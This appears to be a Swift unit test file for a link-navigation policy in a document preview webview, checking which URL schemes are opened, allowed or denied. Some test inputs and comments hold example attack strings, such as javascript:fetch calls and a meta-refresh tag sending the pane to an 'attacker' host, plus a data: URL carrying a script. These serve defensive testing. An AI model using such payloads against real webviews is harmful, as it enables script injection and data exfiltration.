import Foundation
import FolioCore

private func url(_ s: String) -> URL { URL(string: s)! }

func runLinkPolicyTests() {
    // MARK: - User-clicked links

    T.test("http link click opens externally") {
        T.equal(LinkPolicy.decide(for: url("http://example.com"), isLinkActivation: true), .openExternally)
    }
    T.test("https link click opens externally") {
        T.equal(LinkPolicy.decide(for: url("https://example.com/page"), isLinkActivation: true), .openExternally)
    }
    T.test("mailto link click opens externally") {
        T.equal(LinkPolicy.decide(for: url("mailto:a@b.com"), isLinkActivation: true), .openExternally)
    }
    T.test("file link click stays in webview") {
        T.equal(LinkPolicy.decide(for: url("file:///tmp/other.html"), isLinkActivation: true), .allowInWebView)
    }
    T.test("in-page anchor stays in webview") {
        T.equal(LinkPolicy.decide(for: url("file:///tmp/doc.html#section"), isLinkActivation: true), .allowInWebView)
    }
    T.test("javascript: link click is denied") {
        // Otherwise a `<a href="javascript:fetch('https://attacker')">` would execute on click.
        T.equal(LinkPolicy.decide(for: url("javascript:alert(1)"), isLinkActivation: true), .deny)
    }
    T.test("data: link click is denied") {
        // data:text/html URLs would open attacker-controlled HTML inside the preview pane.
        T.equal(LinkPolicy.decide(for: url("data:text/html,<script>alert(1)</script>"), isLinkActivation: true), .deny)
    }

    // MARK: - Non-click navigations (initial loads, meta-refresh, iframes, JS-driven)

    T.test("initial file:// load is allowed") {
        T.equal(LinkPolicy.decide(for: url("file:///tmp/doc.html"), isLinkActivation: false), .allowInWebView)
    }
    T.test("about:blank load is allowed") {
        T.equal(LinkPolicy.decide(for: url("about:blank"), isLinkActivation: false), .allowInWebView)
    }
    T.test("non-click navigation to https is denied (meta-refresh / window.open exfil)") {
        // Closes the silent exfiltration path: a malicious preview file containing
        // `<meta http-equiv="refresh" content="0; url=https://attacker">` would otherwise
        // navigate the pane to an attacker-controlled URL without any user interaction.
        T.equal(LinkPolicy.decide(for: url("https://example.com"), isLinkActivation: false), .deny)
    }
    T.test("non-click navigation to javascript: is denied") {
        T.equal(LinkPolicy.decide(for: url("javascript:fetch('https://attacker')"), isLinkActivation: false), .deny)
    }
}
